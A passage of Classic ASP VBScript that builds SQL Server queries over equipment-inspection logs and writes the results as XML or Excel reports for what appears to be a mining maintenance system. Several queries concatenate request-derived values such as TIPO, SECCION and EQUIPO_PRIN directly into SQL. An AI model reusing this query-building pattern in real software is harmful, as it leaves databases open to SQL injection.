		  Response.Write "<Y>" & ORs.Fields.Item(19).Value & "</Y>" 
		  Response.Write "<EJECUTOR>" & ORs.Fields.Item(20).Value & "</EJECUTOR>" 
		  
		 Set oRsFiles = getFiles(ORs.Fields.Item(0).Value)
		  If Not oRsFiles.EOF Then
		  		If EXCEL = "YES" Then
					Response.Write "<FILE>../Files/" & ORsFiles.Fields.Item(0).Value & "</FILE>"
				Else
		  			Response.Write "<FILE>Files/" & ORsFiles.Fields.Item(0).Value & "</FILE>"
				End If
		  Else
		  		If EXCEL = "YES" Then
					Response.Write "<FILE>../images/noDisponible.png</FILE>"
				Else
		  			Response.Write "<FILE>images/noDisponible.png</FILE>"
				End If
				
		  End If 
	  Response.Write "</ROW>"
	  ORs.MoveNext 
	Wend
	'Response.Write "<sql>" & query & "</sql>"'
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ORsFiles = Nothing
	Set ODB = Nothing
end function


function InfSemInspec()

Session.LCID = 11274

	query = "SELECT ID,"
	query = query & "rtrim(convert(char,B.fecha,103)) + ' ' + "
	query = query & " substring(convert(char,B.fecha,108),1,5) as FECHA"
	query = query & ", TURNO, B.RESPONSABLE,"
	query = query & " B.DESCRIPCION, B.ESTADO, IND_INCIDENTE, TIPO_TURNO, B.EQUIPO,"
	query = query & " B.IND_DANO, B.COLOR, B.CAUSA, E.TIPO_EQUIPO,"
	query = query & " RECOMENDACION, B.UBICACION,  DBO.EquipoPrincipal(B.EQUIPO), DATEDIFF(d,B.FECHA,GETDATE()) "
	query = query & " FROM BITACORAS AS B,  EQUIPOS AS E, EQUIPOS AS EP "
	'query = query & " WHERE MONTH(FECHA)=" & MES' (CONVERT(DATETIME,CONVERT(CHAR,B.FECHA,103))
	query = query & " WHERE B.FECHA BETWEEN CONVERT(datetime," & strNvl(FECHA_INI) & ", 103)"
	query = query & " AND CONVERT(datetime," & strNvl(FECHA_FIN) & ", 103)"
	query = query & " AND B.IND_SOLUCION <> 'true'"
	query = query & " AND  B.UBICACION=" & strNvl(FAENA) & " AND B.UBICACION=E.UBICACION"
	query = query & " AND  B.EQUIPO=E.CODIGO AND DBO.EquipoPrincipal(E.CODIGO) = EP.CODIGO AND E.UBICACION=EP.UBICACION 	" 
	
	If RESPONSABLE<>"TOD" Then
		query = query & " AND B.RESPONSABLE =" & strNvl(RESPONSABLE)
	End if
	
	If LEN(TIPO)>0 Then
		query = query & " AND E.TIPO_EQUIPO =" & strNvl(TIPO)
	End if
	
	If CRITICIDAD<>"TOD" Then
		IF CRITICIDAD = "MEDALTA" THEN
			query = query & " AND B.COLOR IN ('MEDIA','ALTA')"
		ELSE
			query = query & " AND B.COLOR IN (" & strNvl(CRITICIDAD) & ")"
		END IF
	End if
	
	If TURNO<>"TOD" Then
		query = query & " AND TURNO=" & strNvl(TURNO)
	End if
	

	If EQUIPO<>"TOD" AND LEN(EQUIPO)>0 Then
		query = query & " AND DBO.EQUIPOPRINCIPAL(B.EQUIPO)=" & strNvl(EQUIPO)
	End if
	
	
	If IND_DANO<>"TOD" Then
		query = query & " AND IND_DANO=" & strNvl(IND_DANO)
	End if

	If IND_INCIDENTE<>"TOD" Then
		query = query & " AND IND_INCIDENTE=" & strNvl(IND_INCIDENTE)
	End if
	
	If SECCION<>"'TOD'" AND LEN(SECCION)>0 Then
				query = query & " AND DBO.SecEquipoPrincipal(B.EQUIPO) IN (" & SECCION & ")"
	End if
			
	query = query & " GROUP BY ID,"
	query = query & " B.FECHA, TURNO, B.RESPONSABLE,"
	query = query & " B.DESCRIPCION, B.ESTADO, IND_INCIDENTE, TIPO_TURNO, B.EQUIPO,"
	query = query & " B.IND_DANO, B.COLOR, B.CAUSA, "
	query = query & " E.TIPO_EQUIPO, B.RECOMENDACION, B.UBICACION, EP.SECUENCIA "
	query = query & " ORDER BY  B.FECHA desc, EP.SECUENCIA "
	
	Set ORs =oDB.EjecutaSql(query)
	IF EXCEL="YES" THEN	
		Response.Buffer = True
		Response.ContentType = "application/vnd.ms-excel"
		Response.AddHeader "Content-Disposition", "attachment;filename=semanal.xls"
		Response.Write "<?xml version='1.0'  encoding='ISO-8859-1'?>" 
		'Response.Write "<?xml-stylesheet type='text/xsl' href='http://www.ttminsight.cl/sgm/Informes/semanalXLS.xsl'?>" & VbCrLf
	ELSE
		Response.ContentType = "text/xml"
		Response.Write "<?xml version='1.0'  encoding='ISO-8859-1' ?>" 
		'Response.Write "<?xml-stylesheet type='text/xsl' href='../Informes/Inspecciones.xsl'?>" & VbCrLf
	END IF
	

	Response.Write "<REGISTROS>" ' & query
	N=0
	While Not ORs.EOF 
	  Response.Write "<ROW>" 
	  	  N=N+1 
		  Response.Write "<N>" & N & "</N>"
		  Response.Write "<ID>" & ORs.Fields.Item(0).Value & "</ID>"
		  Response.Write "<FECHA>" & ORs.Fields.Item(1).Value & "</FECHA>"
  		  Response.Write "<TURNO>" & ORs.Fields.Item(2).Value & "</TURNO>"
   		  Response.Write "<RESPONSABLE>" & ORs.Fields.Item(3).Value & "</RESPONSABLE>"
   		  Response.Write "<DESCRIPCION>" & ORs.Fields.Item(4).Value & "</DESCRIPCION>"
  		  Response.Write "<ESTADO>" & ORs.Fields.Item(5).Value & "</ESTADO>"
		  Response.Write "<IND_INCIDENTE>" & ORs.Fields.Item(6).Value & "</IND_INCIDENTE>"
  		  Response.Write "<EQUIPO>" & ORs.Fields.Item(8).Value & "</EQUIPO>"
		  Response.Write "<IND_DANO>" & ORs.Fields.Item(9).Value & "</IND_DANO>"
		  Response.Write "<COLOR>" & ORs.Fields.Item(10).Value & "</COLOR>"
		  Response.Write "<CAUSA>" & ORs.Fields.Item(11).Value & "</CAUSA>"
		  Response.Write "<RECOMENDACION>" & ORs.Fields.Item(13).Value & "</RECOMENDACION>"
		  Response.Write "<FAENA>" & ORs.Fields.Item(14).Value & "</FAENA>"
		  Response.Write "<EQUIPO_PRIN>" & ORs.Fields.Item(15).Value & "</EQUIPO_PRIN>"
		  Response.Write "<DIAS>" & ORs.Fields.Item(16).Value & "</DIAS>"
		  Response.Write "<FECHA_INI>" & FECHA_INI & "</FECHA_INI>"
		  Response.Write "<FECHA_FIN>" & FECHA_FIN & "</FECHA_FIN>"
		  Response.Write "<SECCION>" & DESC_SECCION & "</SECCION>"
		  
		'  Set oRsChk = getChecklist(ORs.Fields.Item(0).Value, ORs.Fields.Item(12).Value)
		  sFALLA=""
		'  if Not oRsChk.EOF then
		 ' 	  Response.Write "<FALLAS>" 
		'	  While Not oRsChk.EOF
		'			Response.Write "<DESC_FALLA>" &  oRsChk.Fields.Item(1).Value & "</DESC_FALLA> "
		'			Response.Write "<VALOR_FALLA>" & oRsChk.Fields.Item(3).Value & "</VALOR_FALLA>" 'vbCR'
		'			oRsChk.MoveNext
		'	  Wend
		'	  Response.Write "</FALLAS>" 
		'  end if
		  
	   Set oRsFiles = getFiles(ORs.Fields.Item(0).Value)
	   	if EXCEL<>"YES" then
			Response.Write "<FILES>"	
			if Not oRsFiles.EOF then
				
				While Not oRsFiles.EOF
						filexx = ORsFiles.Fields.Item(0).Value
						if filexx <> "" and not isNull(filexx) then filexx = trim(filexx) end if
						Response.Write "<FILE>http://www.ttminsight.cl/sgm/Files/" & filexx & "</FILE>"
					oRsFiles.MoveNext
				Wend
			end if
			Response.Write "</FILES>"
		 end if
		 Response.Write "</ROW>"
	  ORs.MoveNext
	Wend
	'Response.Write "<sql>" & query & "</sql>"'
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ODB = Nothing
end function

function InfDiaA()

	query = "SELECT B.EQUIPO,  DBO.EquipoPrincipal(B.EQUIPO), E.DESCRIPCION " 
	query = query & "  FROM BITACORAS AS B, EQUIPOS AS E, SECCIONES AS S, EQUIPOS AS EP "
	query = query & "  WHERE CONVERT(DATETIME,CONVERT(CHAR,B.FECHA,103)) <= " & strNvl(TERMINO)
	query = query & "  AND  B.UBICACION=" & strNvl(FAENA) 
	query = query & "  AND DBO.SecEquipoPrincipal(B.EQUIPO)=S.CODIGO"
	query = query & "  AND DBO.EquipoPrincipal(B.EQUIPO)=EP.CODIGO"
	
	If Len(PLANTA)>0 Then
		query = query & "  AND  S.PLANTA=" & strNvl(PLANTA) 
	End If
	
	query = query & "  AND B.EQUIPO=E.CODIGO AND B.IND_SOLUCION <> 'true' AND EP.TIPO_EQUIPO<>17"
	query = query & "  GROUP BY B.EQUIPO, DBO.EquipoPrincipal(B.EQUIPO), E.DESCRIPCION "
	query = query & "  ORDER BY DBO.EquipoPrincipal(B.EQUIPO), B.EQUIPO"	
	
	Set ORs =oDB.EjecutaSql(query)
	
	Dim strName

	strName = Date()
	strName = Replace(strName, "/", "") ' "/" Your local dateseparator?'
	strName = strName & ".xls"
	
	IF EXCEL="YES" THEN	
		Response.ContentType = "application/vnd.ms-excel"
		Response.AddHeader "Content-Disposition", "attachment;filename=" & strName 
	END IF
	
	Response.Write "<?xml version='1.0' encoding='ISO-8859-15'?>" 
	Response.Write "<?xml-stylesheet type='text/xsl' href='../Informes/InfDiaA.xsl?x=44'?>" & VbCrLf & VbCrLf & VbCrLf
	'Response.Write "<?xml-stylesheet type='text/xsl' href='../Informes/infInspecciones.xsl'?>" & VbCrLf & VbCrLf'
	Response.Write "<REGISTROS>" ' & query
	While Not ORs.EOF 
	  Response.Write "<ROW>" 
  		  Response.Write "<EQUIPO>" & ORs.Fields.Item(0).Value & "</EQUIPO>"
		  'Response.Write "<COLOR>" & ORs.Fields.Item(1).Value & "</COLOR>"
		  Response.Write "<EQUIPO_PRIN>" & ORs.Fields.Item(1).Value & "</EQUIPO_PRIN>"
		  Response.Write "<DESC_EQUIPO>" & ORs.Fields.Item(2).Value & "</DESC_EQUIPO>"
		  
		  Set oRsDesc = getDescripciones(TERMINO, FAENA, ORs.Fields.Item(0).Value) 
		   ' ID, FECHA, B.DESCRIPCION, B.EQUIPO, B.COLOR, B.RECOMENDACION '
		  
		  sRECOMENDACION=" "
		  sREPORT =""
		  While Not oRsDesc.EOF
		  		Response.Write "<DESCRIP>" 
		  		Response.Write "<ID>" &  oRsDesc.Fields.Item(0).Value & "</ID> "
				Response.Write "<FECHA>" & oRsDesc.Fields.Item(1).Value & "</FECHA>" 
				Response.Write "<DESCRIPCION>" & oRsDesc.Fields.Item(2).Value & "</DESCRIPCION>" 
				Response.Write "<EQUIPO>" & oRsDesc.Fields.Item(3).Value & "</EQUIPO>" 
				Response.Write "<COLOR>" & oRsDesc.Fields.Item(4).Value & "</COLOR>" 
				'Response.Write "<RECOMENDACION>" & oRsDesc.Fields.Item(5).Value & "</RECOMENDACION>"'
				Response.Write "<REPORT>" & oRsDesc.Fields.Item(6).Value & "</REPORT>"
				sREPORT = sREPORT & oRsDesc.Fields.Item(6).Value & " "
				sRECOMENDACION = sRECOMENDACION & oRsDesc.Fields.Item(5).Value & " "
				Set oRsFiles = getFiles(oRsDesc.Fields.Item(0).Value)
		  		While Not oRsFiles.EOF
		  			Response.Write "<FILES>" 
		  			Response.Write "<FILE>../Files/" & ORsFiles.Fields.Item(0).Value & "</FILE>"
					oRsFiles.MoveNext
					Response.Write "</FILES>" 
		  		Wend
		  
				oRsDesc.MoveNext
				Response.Write "</DESCRIP>" 
		  Wend
		  
		  
		   Response.Write "<RECOMENDACION>" & sRECOMENDACION & "</RECOMENDACION>"
		   Response.Write "<REPORT>" & sREPORT & "</REPORT>"
		   Response.Write "<INICIO>" & INICIO & "</INICIO>"
		   Response.Write "<TERMINO>" & TERMINO & "</TERMINO>"
		   Response.Write "<NUM>" & NUM & "</NUM>"
		   Response.Write "<FOLIO_OT>" & FOLIO_OT & "</FOLIO_OT>"
		   Response.Write "<PLANTA>" & PLANTA & "</PLANTA>"
		  Response.Write "</ROW>"
	  
	  ORs.MoveNext
	Wend
	'Response.Write "<sql>" & query & "</sql>"'
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ODB = Nothing
end function

function InfDiaInspec()

	FECHA_EMI = FECHA
	FECHA = DATEADD("d",1,CDATE(FECHA))
	
	query = "SELECT B.ID,"
	query = query & " RTRIM(CONVERT(char,B.fecha,103)) as FECHA,"
	query = query & " B.TURNO, B.RESPONSABLE,"
	query = query & " B.DESCRIPCION, B.ESTADO, B.IND_INCIDENTE, B.TIPO_TURNO, B.EQUIPO,"
	query = query & " B.IND_DANO, B.COLOR, B.CAUSA, B.UBICACION, E.TIPO_EQUIPO, "
	query = query & " datediff(d,B.FECHA,getdate()), DBO.EQUIPOPRINCIPAL(B.EQUIPO), E.DESCRIPCION, B.RECOMENDACION "
	'query = query & " FROM BITACORAS AS B, EQUIPOS AS E"'
	query = query & " FROM BITACORAS AS B INNER JOIN EQUIPOS AS E ON B.EQUIPO=E.CODIGO AND B.UBICACION=E.UBICACION "
	query = query & " WHERE B.FECHA<=" & strNvl(FECHA)  
	query = query & " AND  B.UBICACION=" & strNvl(FAENA)
	'query = query & " AND  B.EQUIPO=E.CODIGO AND B.UBICACION=E.UBICACION "'
	
	If IND_SOLUCION="TRUE" Then
		query = query & " AND IND_SOLUCION <> 'TRUE' "
	End if
	
	If CRITICIDAD<>"TOD" Then
		query = query & " AND B.COLOR=" & strNvl(CRITICIDAD)
	End if
	
	 If LEN(TIPO)>0 Then
	    query = query & " AND E.TIPO_EQUIPO=" & TIPO
	 End If
	 
	If EQUIPO<>"TOD"  Then
		If strNvl(EQUIPO)="NULL" Then
				query = query & " AND B.EQUIPO IS NULL"
		Else		
			query = query & " AND RTRIM(DBO.EQUIPOPRINCIPAL(B.EQUIPO))=" & strNvl(EQUIPO)
		End If	
	End if
	
	If EQUIPO_PRIN<>"TOD" AND LEN(EQUIPO_PRIN)>0 Then
		query = query & " AND DBO.EQUIPOPRINCIPAL(B.EQUIPO)=" & strNvl(EQUIPO_PRIN)
	End if
	

	query = query & " ORDER BY DBO.EQUIPOPRINCIPAL(B.EQUIPO)"
	
	Set ORs =oDB.EjecutaSql(query)
	
	Dim strName

	strName = Date()
	strName = Replace(strName, "/", "") ' "/" Your local dateseparator?
	strName = strName & ".xls"
	
	IF EXCEL="YES" THEN	
		Response.ContentType = "application/vnd.ms-excel"
		Response.AddHeader "Content-Disposition", "attachment;filename=" & strName 
	END IF
	
	Response.Write "<?xml version='1.0' encoding='iso-8859-1'?>"
	'Response.Write "<?xml-stylesheet type='text/xsl' href='../Informes/InspDiarias.xsl'?>" & VbCrLf & VbCrLf'
	Response.Write "<?xml-stylesheet type='text/xsl' href='../Informes/infInspecciones.xsl?x=437787'?>" & VbCrLf & VbCrLf
	Response.Write "<REGISTROS>" 
	N=0
	While Not ORs.EOF 
	  Response.Write "<ROW>" 
	 	  N=N+1
		  Response.Write "<N>" & N & "</N>"
		  Response.Write "<ID>" & ORs.Fields.Item(0).Value & "</ID>"
		  Response.Write "<FECHA>" & ORs.Fields.Item(1).Value & "</FECHA>"
   		  Response.Write "<RESPONSABLE>" & ORs.Fields.Item(3).Value & "</RESPONSABLE>"
   		  Response.Write "<DESCRIPCION>" & ORs.Fields.Item(4).Value & "</DESCRIPCION>"
		  Response.Write "<IND_INCIDENTE>" & ORs.Fields.Item(6).Value & "</IND_INCIDENTE>"
  		  Response.Write "<EQUIPO>" & ORs.Fields.Item(8).Value & "</EQUIPO>"
		  Response.Write "<IND_DANO>" & ORs.Fields.Item(9).Value & "</IND_DANO>"
		  Response.Write "<COLOR>" & ORs.Fields.Item(10).Value & "</COLOR>"
		  Response.Write "<CAUSA>" & ORs.Fields.Item(11).Value & "</CAUSA>"
		  Response.Write "<FAENA>" & ORs.Fields.Item(12).Value & "</FAENA>"
		  Response.Write "<DIAS>" & ORs.Fields.Item(14).Value & "</DIAS>"
		  Response.Write "<EQUIPO_PRI>" & ORs.Fields.Item(15).Value & "</EQUIPO_PRI>"
		  Response.Write "<DESC_EQUIPO>" & ORs.Fields.Item(16).Value & "</DESC_EQUIPO>"
		  		  
		  Set oRsChk = getChecklist(ORs.Fields.Item(0).Value,ORs.Fields.Item(13).Value)
		  Response.Write "<FALLAS>" 
		  if Not oRsChk.EOF then
			  While Not oRsChk.EOF
					Response.Write "<DESC_FALLA>" &  oRsChk.Fields.Item(1).Value & "</DESC_FALLA> "
					Response.Write "<VALOR_FALLA>" & oRsChk.Fields.Item(3).Value & "</VALOR_FALLA>" 'vbCR'
					oRsChk.MoveNext
			  Wend
		  end if
		  Response.Write "</FALLAS>" 
		 
		 IF EXCEL<>"YES" THEN	
		  Set oRsFiles = getFiles(ORs.Fields.Item(0).Value)
		  	if  Not oRsFiles.EOF then
		  		Response.Write "<FILES>" 
		  		While Not oRsFiles.EOF
		  		Response.Write "<FILE>../Files/" & ORsFiles.Fields.Item(0).Value & "</FILE>"
				oRsFiles.MoveNext
		  		Wend
				Response.Write "</FILES>" 
		  	end if
		 END IF
		 
		  Set oRsHistorial = getHistorial(ORs.Fields.Item(0).Value)
		  		Response.Write "<HISTORIAL>" 
		  While Not oRsHistorial.EOF
		  		Response.Write "<FECHA>" & oRsHistorial.Fields.Item(2).Value & "</FECHA>"
				Response.Write "<INSPECTOR>" & oRsHistorial.Fields.Item(1).Value & "</INSPECTOR>"
				SELECT CASE oRsHistorial.Fields.Item(3).Value
					CASE "1"
						ESTATUS= "DISMINUYE CRITICIDAD"
					CASE "2"
						ESTATUS= "SE MANTIENE CONDICION"
					CASE "3"
						ESTATUS="AUMENTA CRITICIDAD"
				END SELECT 
				
				Response.Write "<STATUS>" & ESTATUS & "</STATUS>"
				oRsHistorial.MoveNext
		  Wend
				Response.Write "</HISTORIAL>" 
		  
		  Response.Write "<FECHA_EMI>" & FECHA_EMI & "</FECHA_EMI>"
		  Response.Write "<RECOMENDACION>" & RECOMENDACION & "</RECOMENDACION>"
		  Response.Write "</ROW>"
	 
	  ORs.MoveNext
	Wend
	
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ODB = Nothing
end function

function getLayout()

	query = "SELECT SUBSTRING(E.LAYOUT, 0, LEN(E.LAYOUT)-3) AS EQUIPO, "
	query = query & " DBO.EquipoPrincipalFaena(B.EQUIPO, B.UBICACION) AS PRINCIPAL, MAX(B.CRITICIDAD), "
	query = query & " E.GCODE, E.LAYOUT, E.X, E.Y"
	query = query & ", COLOR = "
	query = query & " CASE WHEN MAX(B.CRITICIDAD) > 66.7 THEN 'ALTA' WHEN MAX(B.CRITICIDAD) > 33.3 THEN 'MEDIA' "
	query = query & "     WHEN MAX(B.CRITICIDAD) > 0 THEN 'BAJA' ELSE 'NORMAL' END "
	query = query & ", Orden = "
	query = query & " CASE WHEN MAX(B.CRITICIDAD) > 66.7 THEN '1' WHEN MAX(B.CRITICIDAD) > 33.3 THEN '2' "
	query = query & "  				WHEN MAX(B.CRITICIDAD) > 0 THEN '3' ELSE '4' END , E.SECUENCIA, MAX(E.NIVEL) "
	query = query & " "
	query = query & " FROM BITACORAS AS B "  
	query = query & " LEFT OUTER JOIN EQUIPOS AS E ON B.EQUIPO = E.CODIGO AND E.UBICACION = B.UBICACION  "
	query = query & " WHERE (CONVERT(DATETIME,CONVERT(CHAR,B.FECHA,103),103) BETWEEN '01/01/2012' AND '01/12/2050') "
	query = query & " AND  B.UBICACION=" & strNvl(FAENA) 
	
		
	IF EQUIPO<>"TOD"  THEN
		IF strNvl(EQUIPO)="NULL" THEN
			query = query & " AND B.EQUIPO IS NULL"
		ELSE		
			query = query & " AND RTRIM(B.EQUIPO)=" & strNvl(EQUIPO)
		END IF	
	END IF	
	
	 
		query = query & " AND DBO.EquipoPrincipalFaena(B.EQUIPO, B.UBICACION) =" & strNvl(EQUIPO_PRIN)
 
	 
	
	IF IND_SOLUCION<>"TOD" Then
		query = query & " AND IND_SOLUCION=" & strNvl(IND_SOLUCION)
	End if
	
	query = query & " GROUP BY DBO.EquipoPrincipalFaena(B.EQUIPO, B.UBICACION),   E.SECUENCIA ,  "
	query = query & " E.GCODE, E.LAYOUT, X, Y  "
	query = query & " ORDER BY DBO.EquipoPrincipalFaena(B.EQUIPO, B.UBICACION), MAX(B.CRITICIDAD), MAX(E.SECUENCIA) "
	

	'response.write query
	'response.end
	Set ORs =oDB.EjecutaSql(query)
	Dim strName

	strName = Date()
	strName = Replace(strName, "/", "") ' "/" Your local dateseparator?
	'strName = strName & ".xls"
	
	IF EXCEL="YES" THEN	
		Response.Buffer = True
		Response.ContentType = "application/vnd.ms-excel"
		Response.AddHeader "Content-Disposition", "attachment;filename=" & strName 

		Response.Write "<?xml version='1.0' encoding='ISO-8859-15' standalone='no' ?>" 
		Response.Write "<?xml-stylesheet  type='text/xsl' href='equiposRiesgo.xsl?X=34'?>" & VbCrLf & VbCrLf
	ELSE
	Response.ContentType = "text/xml"
		Response.Write "<?xml version='1.0' encoding='ISO-8859-15' ?>" & VbCrLf & VbCrLf
	END IF
	
	Response.Write "<REGISTROS>" '& query
	N=0
	'equipoValor = ""'
	While Not ORs.EOF 
		'if ORs.Fields.Item(0).Value <> equipoValor THEN'
			N=N+1
			Response.Write "<ROW>" 
			Response.Write "<N>" & N & "</N>"
			Response.Write "<EQUIPO>" & ORs.Fields.Item(0).Value & "</EQUIPO>"
			Response.Write "<EQUIPO_PRIN>" & ORs.Fields.Item(1).Value & "</EQUIPO_PRIN>"
			Response.Write "<CRITICIDAD>" & ORs.Fields.Item(2).Value & "</CRITICIDAD>" 
			Response.Write "<GCODE>" & ORs.Fields.Item(3).Value & "</GCODE>" 
			Response.Write "<LAYOUT>" & ORs.Fields.Item(4).Value & "</LAYOUT>" 
			if ORs.Fields.Item(5).Value <> "" then
				Response.Write "<X>" & ORs.Fields.Item(5).Value & "</X>" 
			else
				Response.Write "<X>0</X>" 
			end if
			if ORs.Fields.Item(6).Value <> "" then
				Response.Write "<Y>" & ORs.Fields.Item(6).Value & "</Y>" 
			else
				Response.Write "<Y>0</Y>" 
			end if
			Response.Write "<COLOR>" & ORs.Fields.Item(7).Value & "</COLOR>"
			Response.Write "<NIVEL>" & ORs.Fields.Item(10).Value & "</NIVEL>"
			'Response.Write "<CODIGO>" & ORs.Fields.Item(11).Value & "</CODIGO>"
			
			Response.Write "</ROW>"
		'End if'
		'equipoValor = ORs.Fields.Item(0).Value'
	  ORs.MoveNext 
	Wend
	'Response.Write "<sql>" & query & "</sql>"'
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ORsFiles = Nothing
	Set ODB = Nothing
end function

function getLayout2()

	query = "SELECT "
	if InStr(1, strNvl(EQUIPO_PRIN), "-M") or InStr(1, strNvl(EQUIPO_PRIN), "-EST") then
		query = query&" E.CODIGO AS EQUIPO "
	else
		query = query&" SUBSTRING(E.LAYOUT,0,LEN(E.LAYOUT)-3) AS EQUIPO "
	end if
	query = query&" , DBO.EquipoPrincipalFaena(E.CODIGO,E.UBICACION) AS PRINCIPAL,ISNULL(MAX([dbo].[criticidadEquipo](E.CODIGO, E.UBICACION)),0),E.GCODE,E.LAYOUT,E.X,E.Y"
	query = query&",COLOR=CASE WHEN ISNULL(MAX([dbo].[criticidadEquipo](E.CODIGO, E.UBICACION)),0) > 66.7 THEN 'ALTA' WHEN ISNULL(MAX([dbo].[criticidadEquipo](E.CODIGO, E.UBICACION)),0) > 33.3 THEN 'MEDIA' WHEN ISNULL(MAX([dbo].[criticidadEquipo](E.CODIGO, E.UBICACION)),0)=0 THEN 'NORMAL' ELSE 'BAJA' END "
	query = query&",Orden=CASE WHEN ISNULL(MAX([dbo].[criticidadEquipo](E.CODIGO, E.UBICACION)),0) > 66.7 THEN '1' WHEN ISNULL(MAX([dbo].[criticidadEquipo](E.CODIGO, E.UBICACION)),0) > 33.3 THEN '2' WHEN ISNULL(MAX([dbo].[criticidadEquipo](E.CODIGO, E.UBICACION)),0)=0 THEN '4' ELSE '3' END,E.SECUENCIA, MAX(E.NIVEL) "
	query = query&"FROM EQUIPOS AS E INNER JOIN EQUIPOS_USUARIOS AS EU ON DBO.EquipoPrincipalFaena(E.CODIGO,E.UBICACION)=EU.EQUIPO AND EU.USUARIO=" & strNvl(USUARIO)
	query = query&" WHERE  E.CODIGO <> 'CV00A6-POL' AND E.COD_EQUIPO_PADRE IS NOT NULL AND E.UBICACION=" & strNvl(FAENA)
	if InStr(1, strNvl(EQUIPO_PRIN), "-M") or InStr(1, strNvl(EQUIPO_PRIN), "-EST")  then
		query = query&" AND E.COD_EQUIPO_PADRE IN (SELECT CODIGO FROM EQUIPOS WHERE UBICACION = 'ANDINA' AND COD_EQUIPO_PADRE = " & strNvl(EQUIPO_PRIN) &")"
	else
		query = query&" AND  (E.COD_EQUIPO_PADRE ='" & EQUIPO_PRIN  &"' OR E.COD_EQUIPO_PADRE ='" & EQUIPO_PRIN  &"-POL')"
	end if
	query = query&" AND E.ESTADO = 'ACT'"
	query = query&" AND DBO.EquipoPrincipalFaena(E.CODIGO,E.UBICACION) =DBO.EquipoPrincipalFaena(" & strNvl(EQUIPO_PRIN)  &",E.UBICACION)"
	query = query&" GROUP BY DBO.EquipoPrincipalFaena(E.CODIGO,E.UBICACION),E.SECUENCIA,E.GCODE,E.LAYOUT,X,Y "
	if InStr(1, strNvl(EQUIPO_PRIN), "-M") or InStr(1, strNvl(EQUIPO_PRIN), "-EST") then
		query = query&" ,E.CODIGO "
	end if
	query = query&" ORDER BY DBO.EquipoPrincipalFaena(E.CODIGO,E.UBICACION),E.SECUENCIA,ORDEN "
'	if InStr(1, strNvl(EQUIPO_PRIN), "-M") then
'		Response.Write query
'		Response.End()
'	end if

	Set ORs =oDB.EjecutaSql(query)
	
	Dim strName

	strName = Date()
	strName = Replace(strName, "/", "") ' "/" Your local dateseparator?
	'strName = strName & ".xls"
	
	IF EXCEL="YES" THEN	
		Response.Buffer = True
		Response.ContentType = "application/vnd.ms-excel"
		Response.AddHeader "Content-Disposition", "attachment;filename=" & strName 

		Response.Write "<?xml version='1.0' encoding='ISO-8859-15' standalone='no' ?>" 
		Response.Write "<?xml-stylesheet  type='text/xsl' href='equiposRiesgo.xsl?X=34'?>" & VbCrLf & VbCrLf
	ELSE
		Response.Write "<?xml version='1.0' encoding='ISO-8859-15' ?>" & VbCrLf & VbCrLf
	END IF
	
	Response.Write "<REGISTROS>" '& query
	N=0
	'equipoValor = ""'
	While Not ORs.EOF 
		'if ORs.Fields.Item(0).Value <> equipoValor THEN'
			N=N+1
			Response.Write "<ROW>" 
			Response.Write "<N>" & N & "</N>"
			Response.Write "<EQUIPO>" & ORs.Fields.Item(0).Value & "</EQUIPO>"
			Response.Write "<EQUIPO_PRIN>" & ORs.Fields.Item(1).Value & "</EQUIPO_PRIN>"
			Response.Write "<CRITICIDAD>" & ORs.Fields.Item(2).Value & "</CRITICIDAD>" 
			Response.Write "<GCODE>" & ORs.Fields.Item(3).Value & "</GCODE>" 
			Response.Write "<LAYOUT>" & ORs.Fields.Item(4).Value & "</LAYOUT>" 
			if ORs.Fields.Item(5).Value <> "" then
				Response.Write "<X>" & ORs.Fields.Item(5).Value & "</X>" 
			else
				Response.Write "<X>0</X>" 
			end if
			if ORs.Fields.Item(6).Value <> "" then
				Response.Write "<Y>" & ORs.Fields.Item(6).Value & "</Y>" 
			else
				Response.Write "<Y>0</Y>" 
			end if
			Response.Write "<COLOR>" & ORs.Fields.Item(7).Value & "</COLOR>"
			Response.Write "<NIVEL>" & ORs.Fields.Item(10).Value & "</NIVEL>"
			Response.Write "</ROW>"
		'End if'
		'equipoValor = ORs.Fields.Item(0).Value'
	  ORs.MoveNext 
	Wend
	'Response.Write "<sql>" & query & "</sql>"'
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ORsFiles = Nothing
	Set ODB = Nothing
end function

function getLayout3()

	query = "SELECT SUBSTRING(E.LAYOUT,0,LEN(E.LAYOUT)-3) AS EQUIPO "
	query = query&" , DBO.EquipoPrincipalFaena(E.CODIGO,E.UBICACION) AS PRINCIPAL,ISNULL(MAX([dbo].[criticidadEquipo](E.CODIGO, E.UBICACION)),0),E.GCODE,E.LAYOUT,E.X,E.Y"
	query = query&",COLOR=CASE WHEN ISNULL(MAX([dbo].[criticidadEquipo](E.CODIGO, E.UBICACION)),0) > 66.7 THEN 'ALTA' WHEN ISNULL(MAX([dbo].[criticidadEquipo](E.CODIGO, E.UBICACION)),0) > 33.3 THEN 'MEDIA' WHEN ISNULL(MAX([dbo].[criticidadEquipo](E.CODIGO, E.UBICACION)),0)=0 THEN 'NORMAL' ELSE 'BAJA' END "
	query = query&",Orden=CASE WHEN ISNULL(MAX([dbo].[criticidadEquipo](E.CODIGO, E.UBICACION)),0) > 66.7 THEN '1' WHEN ISNULL(MAX([dbo].[criticidadEquipo](E.CODIGO, E.UBICACION)),0) > 33.3 THEN '2' WHEN ISNULL(MAX([dbo].[criticidadEquipo](E.CODIGO, E.UBICACION)),0)=0 THEN '4' ELSE '3' END,E.SECUENCIA, MAX(E.NIVEL) "
	query = query&"FROM EQUIPOS AS E INNER JOIN EQUIPOS_USUARIOS AS EU ON DBO.EquipoPrincipalFaena(E.CODIGO,E.UBICACION)=EU.EQUIPO AND EU.USUARIO=" & strNvl(USUARIO)
	query = query&" WHERE  E.COD_EQUIPO_PADRE IS NOT NULL AND E.UBICACION=" & strNvl(FAENA)
	query = query&" AND  DBO.EquipoPrincipalFaena(E.CODIGO,E.UBICACION) ='" & EQUIPO_PRIN  &"' "
	query = query&" AND E.ESTADO = 'ACT'"
	query = query&" AND DBO.EquipoPrincipalFaena(E.CODIGO,E.UBICACION) =DBO.EquipoPrincipalFaena(" & strNvl(EQUIPO_PRIN)  &",E.UBICACION)"
	query = query&" GROUP BY DBO.EquipoPrincipalFaena(E.CODIGO,E.UBICACION),E.SECUENCIA,E.GCODE,E.LAYOUT,X,Y "
